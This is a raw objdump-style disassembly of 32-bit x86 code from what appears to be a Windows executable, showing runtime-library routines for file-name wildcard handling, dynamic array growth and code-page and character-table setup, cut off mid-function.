  404b2f:	8d 43 02             	lea    0x2(%ebx),%eax
  404b32:	3b c8                	cmp    %eax,%ecx
  404b34:	74 13                	je     0x404b49
  404b36:	52                   	push   %edx
  404b37:	33 ff                	xor    %edi,%edi
  404b39:	57                   	push   %edi
  404b3a:	57                   	push   %edi
  404b3b:	53                   	push   %ebx
  404b3c:	e8 f2 fe ff ff       	call   0x404a33
  404b41:	83 c4 10             	add    $0x10,%esp
  404b44:	e9 87 00 00 00       	jmp    0x404bd0
  404b49:	6a 2f                	push   $0x2f
  404b4b:	8b c6                	mov    %esi,%eax
  404b4d:	33 ff                	xor    %edi,%edi
  404b4f:	5a                   	pop    %edx
  404b50:	66 3b c2             	cmp    %dx,%ax
  404b53:	74 14                	je     0x404b69
  404b55:	6a 5c                	push   $0x5c
  404b57:	5a                   	pop    %edx
  404b58:	66 3b c2             	cmp    %dx,%ax
  404b5b:	74 0c                	je     0x404b69
  404b5d:	6a 3a                	push   $0x3a
  404b5f:	5a                   	pop    %edx
  404b60:	66 3b c2             	cmp    %dx,%ax
  404b63:	74 04                	je     0x404b69
  404b65:	8b c7                	mov    %edi,%eax
  404b67:	eb 03                	jmp    0x404b6c
  404b69:	33 c0                	xor    %eax,%eax
  404b6b:	40                   	inc    %eax
  404b6c:	2b cb                	sub    %ebx,%ecx
  404b6e:	0f b6 c0             	movzbl %al,%eax
  404b71:	d1 f9                	sar    $1,%ecx
  404b73:	41                   	inc    %ecx
  404b74:	f7 d8                	neg    %eax
  404b76:	68 50 02 00 00       	push   $0x250
  404b7b:	1b c0                	sbb    %eax,%eax
  404b7d:	23 c1                	and    %ecx,%eax
  404b7f:	89 85 a4 fd ff ff    	mov    %eax,-0x25c(%ebp)
  404b85:	8d 85 ac fd ff ff    	lea    -0x254(%ebp),%eax
  404b8b:	57                   	push   %edi
  404b8c:	50                   	push   %eax
  404b8d:	e8 7e d9 ff ff       	call   0x402510
  404b92:	83 c4 0c             	add    $0xc,%esp
  404b95:	8d 85 ac fd ff ff    	lea    -0x254(%ebp),%eax
  404b9b:	57                   	push   %edi
  404b9c:	57                   	push   %edi
  404b9d:	57                   	push   %edi
  404b9e:	50                   	push   %eax
  404b9f:	57                   	push   %edi
  404ba0:	53                   	push   %ebx
  404ba1:	ff 15 00 c1 40 00    	call   *0x40c100
  404ba7:	8b f0                	mov    %eax,%esi
  404ba9:	83 fe ff             	cmp    $0xffffffff,%esi
  404bac:	75 33                	jne    0x404be1
  404bae:	8b 85 a8 fd ff ff    	mov    -0x258(%ebp),%eax
  404bb4:	50                   	push   %eax
  404bb5:	57                   	push   %edi
  404bb6:	57                   	push   %edi
  404bb7:	53                   	push   %ebx
  404bb8:	e8 76 fe ff ff       	call   0x404a33
  404bbd:	83 c4 10             	add    $0x10,%esp
  404bc0:	8b f8                	mov    %eax,%edi
  404bc2:	83 fe ff             	cmp    $0xffffffff,%esi
  404bc5:	74 07                	je     0x404bce
  404bc7:	56                   	push   %esi
  404bc8:	ff 15 58 c0 40 00    	call   *0x40c058
  404bce:	8b c7                	mov    %edi,%eax
  404bd0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404bd3:	5f                   	pop    %edi
  404bd4:	5e                   	pop    %esi
  404bd5:	33 cd                	xor    %ebp,%ecx
  404bd7:	5b                   	pop    %ebx
  404bd8:	e8 eb cb ff ff       	call   0x4017c8
  404bdd:	8b e5                	mov    %ebp,%esp
  404bdf:	5d                   	pop    %ebp
  404be0:	c3                   	ret
  404be1:	8b 8d a8 fd ff ff    	mov    -0x258(%ebp),%ecx
  404be7:	6a 2e                	push   $0x2e
  404be9:	8b 41 04             	mov    0x4(%ecx),%eax
  404bec:	2b 01                	sub    (%ecx),%eax
  404bee:	c1 f8 02             	sar    $0x2,%eax
  404bf1:	89 85 a0 fd ff ff    	mov    %eax,-0x260(%ebp)
  404bf7:	58                   	pop    %eax
  404bf8:	66 39 85 d8 fd ff ff 	cmp    %ax,-0x228(%ebp)
  404bff:	75 1b                	jne    0x404c1c
  404c01:	66 39 bd da fd ff ff 	cmp    %di,-0x226(%ebp)
  404c08:	74 2d                	je     0x404c37
  404c0a:	66 39 85 da fd ff ff 	cmp    %ax,-0x226(%ebp)
  404c11:	75 09                	jne    0x404c1c
  404c13:	66 39 bd dc fd ff ff 	cmp    %di,-0x224(%ebp)
  404c1a:	74 1b                	je     0x404c37
  404c1c:	51                   	push   %ecx
  404c1d:	ff b5 a4 fd ff ff    	push   -0x25c(%ebp)
  404c23:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
  404c29:	53                   	push   %ebx
  404c2a:	50                   	push   %eax
  404c2b:	e8 03 fe ff ff       	call   0x404a33
  404c30:	83 c4 10             	add    $0x10,%esp
  404c33:	85 c0                	test   %eax,%eax
  404c35:	75 89                	jne    0x404bc0
  404c37:	8d 85 ac fd ff ff    	lea    -0x254(%ebp),%eax
  404c3d:	50                   	push   %eax
  404c3e:	56                   	push   %esi
  404c3f:	ff 15 60 c0 40 00    	call   *0x40c060
  404c45:	8b 8d a8 fd ff ff    	mov    -0x258(%ebp),%ecx
  404c4b:	85 c0                	test   %eax,%eax
  404c4d:	6a 2e                	push   $0x2e
  404c4f:	58                   	pop    %eax
  404c50:	75 a6                	jne    0x404bf8
  404c52:	8b c1                	mov    %ecx,%eax
  404c54:	8b 8d a0 fd ff ff    	mov    -0x260(%ebp),%ecx
  404c5a:	8b 10                	mov    (%eax),%edx
  404c5c:	8b 40 04             	mov    0x4(%eax),%eax
  404c5f:	2b c2                	sub    %edx,%eax
  404c61:	c1 f8 02             	sar    $0x2,%eax
  404c64:	3b c8                	cmp    %eax,%ecx
  404c66:	0f 84 56 ff ff ff    	je     0x404bc2
  404c6c:	68 4e 48 40 00       	push   $0x40484e
  404c71:	2b c1                	sub    %ecx,%eax
  404c73:	6a 04                	push   $0x4
  404c75:	50                   	push   %eax
  404c76:	8d 04 8a             	lea    (%edx,%ecx,4),%eax
  404c79:	50                   	push   %eax
  404c7a:	e8 a1 28 00 00       	call   0x407520
  404c7f:	83 c4 10             	add    $0x10,%esp
  404c82:	e9 3b ff ff ff       	jmp    0x404bc2
  404c87:	8b ff                	mov    %edi,%edi
  404c89:	56                   	push   %esi
  404c8a:	57                   	push   %edi
  404c8b:	8b f9                	mov    %ecx,%edi
  404c8d:	8b 37                	mov    (%edi),%esi
  404c8f:	eb 0b                	jmp    0x404c9c
  404c91:	ff 36                	push   (%esi)
  404c93:	e8 75 f1 ff ff       	call   0x403e0d
  404c98:	59                   	pop    %ecx
  404c99:	83 c6 04             	add    $0x4,%esi
  404c9c:	3b 77 04             	cmp    0x4(%edi),%esi
  404c9f:	75 f0                	jne    0x404c91
  404ca1:	ff 37                	push   (%edi)
  404ca3:	e8 65 f1 ff ff       	call   0x403e0d
  404ca8:	59                   	pop    %ecx
  404ca9:	5f                   	pop    %edi
  404caa:	5e                   	pop    %esi
  404cab:	c3                   	ret
  404cac:	8b ff                	mov    %edi,%edi
  404cae:	55                   	push   %ebp
  404caf:	8b ec                	mov    %esp,%ebp
  404cb1:	56                   	push   %esi
  404cb2:	57                   	push   %edi
  404cb3:	8b f1                	mov    %ecx,%esi
  404cb5:	e8 27 00 00 00       	call   0x404ce1
  404cba:	8b f8                	mov    %eax,%edi
  404cbc:	85 ff                	test   %edi,%edi
  404cbe:	74 0d                	je     0x404ccd
  404cc0:	ff 75 08             	push   0x8(%ebp)
  404cc3:	e8 45 f1 ff ff       	call   0x403e0d
  404cc8:	59                   	pop    %ecx
  404cc9:	8b c7                	mov    %edi,%eax
  404ccb:	eb 0e                	jmp    0x404cdb
  404ccd:	8b 4e 04             	mov    0x4(%esi),%ecx
  404cd0:	8b 45 08             	mov    0x8(%ebp),%eax
  404cd3:	89 01                	mov    %eax,(%ecx)
  404cd5:	83 46 04 04          	addl   $0x4,0x4(%esi)
  404cd9:	33 c0                	xor    %eax,%eax
  404cdb:	5f                   	pop    %edi
  404cdc:	5e                   	pop    %esi
  404cdd:	5d                   	pop    %ebp
  404cde:	c2 04 00             	ret    $0x4
  404ce1:	8b ff                	mov    %edi,%edi
  404ce3:	56                   	push   %esi
  404ce4:	8b f1                	mov    %ecx,%esi
  404ce6:	57                   	push   %edi
  404ce7:	8b 7e 08             	mov    0x8(%esi),%edi
  404cea:	39 7e 04             	cmp    %edi,0x4(%esi)
  404ced:	74 04                	je     0x404cf3
  404cef:	33 c0                	xor    %eax,%eax
  404cf1:	eb 72                	jmp    0x404d65
  404cf3:	83 3e 00             	cmpl   $0x0,(%esi)
  404cf6:	75 2b                	jne    0x404d23
  404cf8:	6a 04                	push   $0x4
  404cfa:	6a 04                	push   $0x4
  404cfc:	e8 d7 f1 ff ff       	call   0x403ed8
  404d01:	6a 00                	push   $0x0
  404d03:	89 06                	mov    %eax,(%esi)
  404d05:	e8 03 f1 ff ff       	call   0x403e0d
  404d0a:	8b 06                	mov    (%esi),%eax
  404d0c:	83 c4 0c             	add    $0xc,%esp
  404d0f:	85 c0                	test   %eax,%eax
  404d11:	75 05                	jne    0x404d18
  404d13:	6a 0c                	push   $0xc
  404d15:	58                   	pop    %eax
  404d16:	eb 4d                	jmp    0x404d65
  404d18:	89 46 04             	mov    %eax,0x4(%esi)
  404d1b:	83 c0 10             	add    $0x10,%eax
  404d1e:	89 46 08             	mov    %eax,0x8(%esi)
  404d21:	eb cc                	jmp    0x404cef
  404d23:	2b 3e                	sub    (%esi),%edi
  404d25:	c1 ff 02             	sar    $0x2,%edi
  404d28:	81 ff ff ff ff 7f    	cmp    $0x7fffffff,%edi
  404d2e:	77 e3                	ja     0x404d13
  404d30:	53                   	push   %ebx
  404d31:	6a 04                	push   $0x4
  404d33:	8d 1c 3f             	lea    (%edi,%edi,1),%ebx
  404d36:	53                   	push   %ebx
  404d37:	ff 36                	push   (%esi)
  404d39:	e8 52 1a 00 00       	call   0x406790
  404d3e:	83 c4 0c             	add    $0xc,%esp
  404d41:	85 c0                	test   %eax,%eax
  404d43:	75 05                	jne    0x404d4a
  404d45:	6a 0c                	push   $0xc
  404d47:	5e                   	pop    %esi
  404d48:	eb 10                	jmp    0x404d5a
  404d4a:	89 06                	mov    %eax,(%esi)
  404d4c:	8d 0c b8             	lea    (%eax,%edi,4),%ecx
  404d4f:	8d 04 98             	lea    (%eax,%ebx,4),%eax
  404d52:	89 4e 04             	mov    %ecx,0x4(%esi)
  404d55:	89 46 08             	mov    %eax,0x8(%esi)
  404d58:	33 f6                	xor    %esi,%esi
  404d5a:	6a 00                	push   $0x0
  404d5c:	e8 ac f0 ff ff       	call   0x403e0d
  404d61:	59                   	pop    %ecx
  404d62:	8b c6                	mov    %esi,%eax
  404d64:	5b                   	pop    %ebx
  404d65:	5f                   	pop    %edi
  404d66:	5e                   	pop    %esi
  404d67:	c3                   	ret
  404d68:	8b ff                	mov    %edi,%edi
  404d6a:	55                   	push   %ebp
  404d6b:	8b ec                	mov    %esp,%ebp
  404d6d:	5d                   	pop    %ebp
  404d6e:	e9 f3 fa ff ff       	jmp    0x404866
  404d73:	6a 08                	push   $0x8
  404d75:	68 68 18 41 00       	push   $0x411868
  404d7a:	e8 91 d3 ff ff       	call   0x402110
  404d7f:	8b 45 08             	mov    0x8(%ebp),%eax
  404d82:	ff 30                	push   (%eax)
  404d84:	e8 d7 08 00 00       	call   0x405660
  404d89:	59                   	pop    %ecx
  404d8a:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404d8e:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404d91:	e8 48 00 00 00       	call   0x404dde
  404d96:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404d9d:	e8 08 00 00 00       	call   0x404daa
  404da2:	e8 af d3 ff ff       	call   0x402156
  404da7:	c2 0c 00             	ret    $0xc
  404daa:	8b 45 10             	mov    0x10(%ebp),%eax
  404dad:	ff 30                	push   (%eax)
  404daf:	e8 f4 08 00 00       	call   0x4056a8
  404db4:	59                   	pop    %ecx
  404db5:	c3                   	ret
  404db6:	8b ff                	mov    %edi,%edi
  404db8:	55                   	push   %ebp
  404db9:	8b ec                	mov    %esp,%ebp
  404dbb:	83 ec 0c             	sub    $0xc,%esp
  404dbe:	8b 45 08             	mov    0x8(%ebp),%eax
  404dc1:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  404dc4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404dc7:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404dca:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404dcd:	50                   	push   %eax
  404dce:	ff 75 0c             	push   0xc(%ebp)
  404dd1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404dd4:	50                   	push   %eax
  404dd5:	e8 99 ff ff ff       	call   0x404d73
  404dda:	8b e5                	mov    %ebp,%esp
  404ddc:	5d                   	pop    %ebp
  404ddd:	c3                   	ret
  404dde:	8b ff                	mov    %edi,%edi
  404de0:	56                   	push   %esi
  404de1:	8b f1                	mov    %ecx,%esi
  404de3:	6a 0c                	push   $0xc
  404de5:	8b 06                	mov    (%esi),%eax
  404de7:	8b 00                	mov    (%eax),%eax
  404de9:	8b 40 48             	mov    0x48(%eax),%eax
  404dec:	8b 40 04             	mov    0x4(%eax),%eax
  404def:	a3 00 3e 41 00       	mov    %eax,0x413e00
  404df4:	8b 06                	mov    (%esi),%eax
  404df6:	8b 00                	mov    (%eax),%eax
  404df8:	8b 40 48             	mov    0x48(%eax),%eax
  404dfb:	8b 40 08             	mov    0x8(%eax),%eax
  404dfe:	a3 04 3e 41 00       	mov    %eax,0x413e04
  404e03:	8b 06                	mov    (%esi),%eax
  404e05:	8b 00                	mov    (%eax),%eax
  404e07:	8b 40 48             	mov    0x48(%eax),%eax
  404e0a:	8b 80 1c 02 00 00    	mov    0x21c(%eax),%eax
  404e10:	a3 fc 3d 41 00       	mov    %eax,0x413dfc
  404e15:	8b 06                	mov    (%esi),%eax
  404e17:	8b 00                	mov    (%eax),%eax
  404e19:	8b 40 48             	mov    0x48(%eax),%eax
  404e1c:	83 c0 0c             	add    $0xc,%eax
  404e1f:	50                   	push   %eax
  404e20:	6a 0c                	push   $0xc
  404e22:	68 08 3e 41 00       	push   $0x413e08
  404e27:	e8 d2 06 00 00       	call   0x4054fe
  404e2c:	8b 06                	mov    (%esi),%eax
  404e2e:	b9 01 01 00 00       	mov    $0x101,%ecx
  404e33:	51                   	push   %ecx
  404e34:	8b 00                	mov    (%eax),%eax
  404e36:	8b 40 48             	mov    0x48(%eax),%eax
  404e39:	83 c0 18             	add    $0x18,%eax
  404e3c:	50                   	push   %eax
  404e3d:	51                   	push   %ecx
  404e3e:	68 48 31 41 00       	push   $0x413148
  404e43:	e8 b6 06 00 00       	call   0x4054fe
  404e48:	8b 06                	mov    (%esi),%eax
  404e4a:	b9 00 01 00 00       	mov    $0x100,%ecx
  404e4f:	51                   	push   %ecx
  404e50:	8b 00                	mov    (%eax),%eax
  404e52:	8b 40 48             	mov    0x48(%eax),%eax
  404e55:	05 19 01 00 00       	add    $0x119,%eax
  404e5a:	50                   	push   %eax
  404e5b:	51                   	push   %ecx
  404e5c:	68 50 32 41 00       	push   $0x413250
  404e61:	e8 98 06 00 00       	call   0x4054fe
  404e66:	a1 70 35 41 00       	mov    0x413570,%eax
  404e6b:	83 c4 30             	add    $0x30,%esp
  404e6e:	83 c9 ff             	or     $0xffffffff,%ecx
  404e71:	f0 0f c1 08          	lock xadd %ecx,(%eax)
  404e75:	75 13                	jne    0x404e8a
  404e77:	a1 70 35 41 00       	mov    0x413570,%eax
  404e7c:	3d 50 33 41 00       	cmp    $0x413350,%eax
  404e81:	74 07                	je     0x404e8a
  404e83:	50                   	push   %eax
  404e84:	e8 84 ef ff ff       	call   0x403e0d
  404e89:	59                   	pop    %ecx
  404e8a:	8b 06                	mov    (%esi),%eax
  404e8c:	8b 00                	mov    (%eax),%eax
  404e8e:	8b 40 48             	mov    0x48(%eax),%eax
  404e91:	a3 70 35 41 00       	mov    %eax,0x413570
  404e96:	8b 06                	mov    (%esi),%eax
  404e98:	8b 00                	mov    (%eax),%eax
  404e9a:	8b 40 48             	mov    0x48(%eax),%eax
  404e9d:	f0 ff 00             	lock incl (%eax)
  404ea0:	5e                   	pop    %esi
  404ea1:	c3                   	ret
  404ea2:	8b ff                	mov    %edi,%edi
  404ea4:	55                   	push   %ebp
  404ea5:	8b ec                	mov    %esp,%ebp
  404ea7:	8b 45 08             	mov    0x8(%ebp),%eax
  404eaa:	2d a4 03 00 00       	sub    $0x3a4,%eax
  404eaf:	74 28                	je     0x404ed9
  404eb1:	83 e8 04             	sub    $0x4,%eax
  404eb4:	74 1c                	je     0x404ed2
  404eb6:	83 e8 0d             	sub    $0xd,%eax
  404eb9:	74 10                	je     0x404ecb
  404ebb:	83 e8 01             	sub    $0x1,%eax
  404ebe:	74 04                	je     0x404ec4
  404ec0:	33 c0                	xor    %eax,%eax
  404ec2:	5d                   	pop    %ebp
  404ec3:	c3                   	ret
  404ec4:	a1 e4 cc 40 00       	mov    0x40cce4,%eax
  404ec9:	5d                   	pop    %ebp
  404eca:	c3                   	ret
  404ecb:	a1 e0 cc 40 00       	mov    0x40cce0,%eax
  404ed0:	5d                   	pop    %ebp
  404ed1:	c3                   	ret
  404ed2:	a1 dc cc 40 00       	mov    0x40ccdc,%eax
  404ed7:	5d                   	pop    %ebp
  404ed8:	c3                   	ret
  404ed9:	a1 d8 cc 40 00       	mov    0x40ccd8,%eax
  404ede:	5d                   	pop    %ebp
  404edf:	c3                   	ret
  404ee0:	8b ff                	mov    %edi,%edi
  404ee2:	55                   	push   %ebp
  404ee3:	8b ec                	mov    %esp,%ebp
  404ee5:	83 ec 10             	sub    $0x10,%esp
  404ee8:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  404eeb:	6a 00                	push   $0x0
  404eed:	e8 43 f0 ff ff       	call   0x403f35
  404ef2:	83 25 14 3e 41 00 00 	andl   $0x0,0x413e14
  404ef9:	8b 45 08             	mov    0x8(%ebp),%eax
  404efc:	83 f8 fe             	cmp    $0xfffffffe,%eax
  404eff:	75 12                	jne    0x404f13
  404f01:	c7 05 14 3e 41 00 01 	movl   $0x1,0x413e14
  404f08:	00 00 00 
  404f0b:	ff 15 08 c1 40 00    	call   *0x40c108
  404f11:	eb 2c                	jmp    0x404f3f
  404f13:	83 f8 fd             	cmp    $0xfffffffd,%eax
  404f16:	75 12                	jne    0x404f2a
  404f18:	c7 05 14 3e 41 00 01 	movl   $0x1,0x413e14
  404f1f:	00 00 00 
  404f22:	ff 15 f4 c0 40 00    	call   *0x40c0f4
  404f28:	eb 15                	jmp    0x404f3f
  404f2a:	83 f8 fc             	cmp    $0xfffffffc,%eax
  404f2d:	75 10                	jne    0x404f3f
  404f2f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404f32:	c7 05 14 3e 41 00 01 	movl   $0x1,0x413e14
  404f39:	00 00 00 
  404f3c:	8b 40 08             	mov    0x8(%eax),%eax
  404f3f:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  404f43:	74 0a                	je     0x404f4f
  404f45:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404f48:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  404f4f:	8b e5                	mov    %ebp,%esp
  404f51:	5d                   	pop    %ebp
  404f52:	c3                   	ret
  404f53:	8b ff                	mov    %edi,%edi
  404f55:	55                   	push   %ebp
  404f56:	8b ec                	mov    %esp,%ebp
  404f58:	53                   	push   %ebx
  404f59:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404f5c:	56                   	push   %esi
  404f5d:	57                   	push   %edi
  404f5e:	68 01 01 00 00       	push   $0x101
  404f63:	33 ff                	xor    %edi,%edi
  404f65:	8d 73 18             	lea    0x18(%ebx),%esi
  404f68:	57                   	push   %edi
  404f69:	56                   	push   %esi
  404f6a:	e8 a1 d5 ff ff       	call   0x402510
  404f6f:	89 7b 04             	mov    %edi,0x4(%ebx)
  404f72:	33 c0                	xor    %eax,%eax
  404f74:	89 7b 08             	mov    %edi,0x8(%ebx)
  404f77:	83 c4 0c             	add    $0xc,%esp
  404f7a:	89 bb 1c 02 00 00    	mov    %edi,0x21c(%ebx)
  404f80:	b9 01 01 00 00       	mov    $0x101,%ecx
  404f85:	8d 7b 0c             	lea    0xc(%ebx),%edi
  404f88:	ab                   	stos   %eax,%es:(%edi)
  404f89:	ab                   	stos   %eax,%es:(%edi)
  404f8a:	ab                   	stos   %eax,%es:(%edi)
  404f8b:	bf 50 33 41 00       	mov    $0x413350,%edi
  404f90:	2b fb                	sub    %ebx,%edi
  404f92:	8a 04 37             	mov    (%edi,%esi,1),%al
  404f95:	88 06                	mov    %al,(%esi)
  404f97:	46                   	inc    %esi
  404f98:	83 e9 01             	sub    $0x1,%ecx
  404f9b:	75 f5                	jne    0x404f92
  404f9d:	8d 8b 19 01 00 00    	lea    0x119(%ebx),%ecx
  404fa3:	ba 00 01 00 00       	mov    $0x100,%edx
  404fa8:	8a 04 39             	mov    (%ecx,%edi,1),%al
  404fab:	88 01                	mov    %al,(%ecx)
  404fad:	41                   	inc    %ecx
  404fae:	83 ea 01             	sub    $0x1,%edx
  404fb1:	75 f5                	jne    0x404fa8
  404fb3:	5f                   	pop    %edi
  404fb4:	5e                   	pop    %esi
  404fb5:	5b                   	pop    %ebx
  404fb6:	5d                   	pop    %ebp
  404fb7:	c3                   	ret
  404fb8:	8b ff                	mov    %edi,%edi
  404fba:	55                   	push   %ebp
  404fbb:	8b ec                	mov    %esp,%ebp
  404fbd:	81 ec 20 07 00 00    	sub    $0x720,%esp
  404fc3:	a1 04 30 41 00       	mov    0x413004,%eax
  404fc8:	33 c5                	xor    %ebp,%eax
  404fca:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404fcd:	53                   	push   %ebx
  404fce:	56                   	push   %esi
  404fcf:	8b 75 08             	mov    0x8(%ebp),%esi
  404fd2:	8d 85 e8 f8 ff ff    	lea    -0x718(%ebp),%eax
  404fd8:	57                   	push   %edi
  404fd9:	50                   	push   %eax
  404fda:	ff 76 04             	push   0x4(%esi)
  404fdd:	ff 15 0c c1 40 00    	call   *0x40c10c
  404fe3:	33 db                	xor    %ebx,%ebx
  404fe5:	bf 00 01 00 00       	mov    $0x100,%edi
  404fea:	85 c0                	test   %eax,%eax
  404fec:	0f 84 f0 00 00 00    	je     0x4050e2
  404ff2:	8b c3                	mov    %ebx,%eax
  404ff4:	88 84 05 fc fe ff ff 	mov    %al,-0x104(%ebp,%eax,1)
  404ffb:	40                   	inc    %eax
  404ffc:	3b c7                	cmp    %edi,%eax
  404ffe:	72 f4                	jb     0x404ff4
  405000:	8a 85 ee f8 ff ff    	mov    -0x712(%ebp),%al
  405006:	8d 8d ee f8 ff ff    	lea    -0x712(%ebp),%ecx
  40500c:	c6 85 fc fe ff ff 20 	movb   $0x20,-0x104(%ebp)
  405013:	eb 1f                	jmp    0x405034
  405015:	0f b6 51 01          	movzbl 0x1(%ecx),%edx
  405019:	0f b6 c0             	movzbl %al,%eax
  40501c:	eb 0d                	jmp    0x40502b
  40501e:	3b c7                	cmp    %edi,%eax
  405020:	73 0d                	jae    0x40502f
  405022:	c6 84 05 fc fe ff ff 	movb   $0x20,-0x104(%ebp,%eax,1)
  405029:	20 
  40502a:	40                   	inc    %eax
  40502b:	3b c2                	cmp    %edx,%eax
  40502d:	76 ef                	jbe    0x40501e
  40502f:	83 c1 02             	add    $0x2,%ecx
  405032:	8a 01                	mov    (%ecx),%al
  405034:	84 c0                	test   %al,%al
  405036:	75 dd                	jne    0x405015
  405038:	53                   	push   %ebx
  405039:	ff 76 04             	push   0x4(%esi)
  40503c:	8d 85 fc f8 ff ff    	lea    -0x704(%ebp),%eax
  405042:	50                   	push   %eax
  405043:	57                   	push   %edi
  405044:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  40504a:	50                   	push   %eax
  40504b:	6a 01                	push   $0x1
  40504d:	53                   	push   %ebx
  40504e:	e8 6f 12 00 00       	call   0x4062c2
  405053:	53                   	push   %ebx
  405054:	ff 76 04             	push   0x4(%esi)
  405057:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40505d:	57                   	push   %edi
  40505e:	50                   	push   %eax
  40505f:	57                   	push   %edi
  405060:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  405066:	50                   	push   %eax
  405067:	57                   	push   %edi
  405068:	ff b6 1c 02 00 00    	push   0x21c(%esi)
  40506e:	53                   	push   %ebx
  40506f:	e8 b8 2a 00 00       	call   0x407b2c
  405074:	83 c4 40             	add    $0x40,%esp
  405077:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
  40507d:	53                   	push   %ebx
  40507e:	ff 76 04             	push   0x4(%esi)
  405081:	57                   	push   %edi
  405082:	50                   	push   %eax
  405083:	57                   	push   %edi
  405084:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  40508a:	50                   	push   %eax
  40508b:	68 00 02 00 00       	push   $0x200
  405090:	ff b6 1c 02 00 00    	push   0x21c(%esi)
  405096:	53                   	push   %ebx
  405097:	e8 90 2a 00 00       	call   0x407b2c
  40509c:	83 c4 24             	add    $0x24,%esp
  40509f:	8b cb                	mov    %ebx,%ecx
  4050a1:	0f b7 84 4d fc f8 ff 	movzwl -0x704(%ebp,%ecx,2),%eax
  4050a8:	ff 
  4050a9:	a8 01                	test   $0x1,%al
  4050ab:	74 0e                	je     0x4050bb
  4050ad:	80 4c 0e 19 10       	orb    $0x10,0x19(%esi,%ecx,1)
  4050b2:	8a 84 0d fc fd ff ff 	mov    -0x204(%ebp,%ecx,1),%al
  4050b9:	eb 10                	jmp    0x4050cb
  4050bb:	a8 02                	test   $0x2,%al
  4050bd:	74 15                	je     0x4050d4
  4050bf:	80 4c 0e 19 20       	orb    $0x20,0x19(%esi,%ecx,1)
  4050c4:	8a 84 0d fc fc ff ff 	mov    -0x304(%ebp,%ecx,1),%al
  4050cb:	88 84 0e 19 01 00 00 	mov    %al,0x119(%esi,%ecx,1)
  4050d2:	eb 07                	jmp    0x4050db
  4050d4:	88 9c 0e 19 01 00 00 	mov    %bl,0x119(%esi,%ecx,1)
  4050db:	41                   	inc    %ecx
  4050dc:	3b cf                	cmp    %edi,%ecx
  4050de:	72 c1                	jb     0x4050a1
  4050e0:	eb 59                	jmp    0x40513b
  4050e2:	6a 9f                	push   $0xffffff9f
  4050e4:	8d 96 19 01 00 00    	lea    0x119(%esi),%edx
  4050ea:	8b cb                	mov    %ebx,%ecx
  4050ec:	58                   	pop    %eax
  4050ed:	2b c2                	sub    %edx,%eax
  4050ef:	89 85 e0 f8 ff ff    	mov    %eax,-0x720(%ebp)
  4050f5:	03 d1                	add    %ecx,%edx
  4050f7:	03 c2                	add    %edx,%eax
  4050f9:	89 85 e4 f8 ff ff    	mov    %eax,-0x71c(%ebp)
  4050ff:	83 c0 20             	add    $0x20,%eax
  405102:	83 f8 19             	cmp    $0x19,%eax
  405105:	77 0a                	ja     0x405111
  405107:	80 4c 0e 19 10       	orb    $0x10,0x19(%esi,%ecx,1)
  40510c:	8d 41 20             	lea    0x20(%ecx),%eax
  40510f:	eb 13                	jmp    0x405124
  405111:	83 bd e4 f8 ff ff 19 	cmpl   $0x19,-0x71c(%ebp)
  405118:	77 0e                	ja     0x405128
  40511a:	8d 04 0e             	lea    (%esi,%ecx,1),%eax
  40511d:	80 48 19 20          	orb    $0x20,0x19(%eax)
  405121:	8d 41 e0             	lea    -0x20(%ecx),%eax
  405124:	88 02                	mov    %al,(%edx)
  405126:	eb 02                	jmp    0x40512a
  405128:	88 1a                	mov    %bl,(%edx)
  40512a:	8b 85 e0 f8 ff ff    	mov    -0x720(%ebp),%eax
  405130:	8d 96 19 01 00 00    	lea    0x119(%esi),%edx
  405136:	41                   	inc    %ecx
  405137:	3b cf                	cmp    %edi,%ecx
  405139:	72 ba                	jb     0x4050f5
  40513b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40513e:	5f                   	pop    %edi
  40513f:	5e                   	pop    %esi
  405140:	33 cd                	xor    %ebp,%ecx
  405142:	5b                   	pop    %ebx
  405143:	e8 80 c6 ff ff       	call   0x4017c8
  405148:	8b e5                	mov    %ebp,%esp
  40514a:	5d                   	pop    %ebp
  40514b:	c3                   	ret
  40514c:	8b ff                	mov    %edi,%edi
  40514e:	55                   	push   %ebp
  40514f:	8b ec                	mov    %esp,%ebp
  405151:	83 ec 0c             	sub    $0xc,%esp
  405154:	e8 d1 f1 ff ff       	call   0x40432a
  405159:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40515c:	e8 0a 01 00 00       	call   0x40526b
  405161:	ff 75 08             	push   0x8(%ebp)
  405164:	e8 77 fd ff ff       	call   0x404ee0
  405169:	59                   	pop    %ecx
  40516a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40516d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405170:	8b 49 48             	mov    0x48(%ecx),%ecx
  405173:	3b 41 04             	cmp    0x4(%ecx),%eax
  405176:	75 04                	jne    0x40517c
  405178:	33 c0                	xor    %eax,%eax
  40517a:	eb 53                	jmp    0x4051cf
  40517c:	53                   	push   %ebx
  40517d:	56                   	push   %esi
  40517e:	57                   	push   %edi
  40517f:	68 20 02 00 00       	push   $0x220
  405184:	e8 be ec ff ff       	call   0x403e47
  405189:	8b f8                	mov    %eax,%edi
  40518b:	83 cb ff             	or     $0xffffffff,%ebx
  40518e:	59                   	pop    %ecx
  40518f:	85 ff                	test   %edi,%edi
  405191:	74 2e                	je     0x4051c1
  405193:	8b 75 fc             	mov    -0x4(%ebp),%esi
